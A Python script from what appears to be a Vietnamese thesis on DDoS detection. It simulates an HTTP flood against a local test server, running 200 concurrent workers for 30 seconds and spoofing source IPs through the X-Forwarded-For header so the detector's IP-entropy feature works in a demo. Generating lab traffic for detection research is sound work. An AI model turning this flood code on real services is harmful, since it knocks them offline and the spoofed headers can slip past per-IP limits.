"""
experiments/attack_http_flood.py
4.1.2 Mô phỏng HTTP Flood (tấn công tầng ứng dụng, số request/giây rất cao).

Lưu ý: khi chạy trên 1 máy local, mọi request thực chất đến từ cùng 1 IP nguồn.
Script giả lập nhiều IP nguồn bằng header X-Forwarded-For (app/main.py đã được
cấu hình đọc IP từ header này) để đặc trưng ip_entropy có ý nghĩa khi demo trên
1 máy. Cần ghi rõ giả định này trong mục 4.1.2 và 4.5 của luận văn.

Chạy: python experiments/attack_http_flood.py
"""
import asyncio
import random
import time
from pathlib import Path

import aiohttp

TARGET = "http://localhost:8000/"
CONCURRENCY = 200
DURATION_S = 30

LOG_DIR = Path(__file__).resolve().parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


async def flood_worker(session, stop_at, fake_ip):
    headers = {"X-Forwarded-For": fake_ip}
    while time.time() < stop_at:
        try:
            async with session.get(TARGET, headers=headers) as resp:
                await resp.read()
        except Exception:
            pass


async def main():
    start = time.time()
    with open(LOG_DIR / "attack_start.log", "a") as f:
        f.write(f"http_flood_start\t{start}\n")

    stop_at = start + DURATION_S
    async with aiohttp.ClientSession() as session:
        workers = [
            flood_worker(session, stop_at, f"10.0.{random.randint(0, 9)}.{i % 255}")
            for i in range(CONCURRENCY)
        ]
        await asyncio.gather(*workers)

    print(f"HTTP flood xong sau {DURATION_S}s, bắt đầu lúc {start}")


if __name__ == "__main__":
    asyncio.run(main())
